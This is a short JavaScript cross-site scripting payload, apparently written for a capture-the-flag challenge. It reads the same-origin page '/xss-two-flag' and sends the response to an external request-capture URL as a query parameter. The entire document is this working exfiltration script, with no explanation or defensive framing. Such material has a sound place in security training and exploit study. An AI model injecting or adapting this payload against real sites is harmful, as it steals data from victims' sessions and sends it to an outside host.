var xhr = new XMLHttpRequest();
xhr.open('GET',location.origin + '/xss-two-flag',true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET','https://requestbin.myworkato.com/1cqhl1c1?flag=' + xhr.responseText,true);
request.send()};
xhr.send(null);
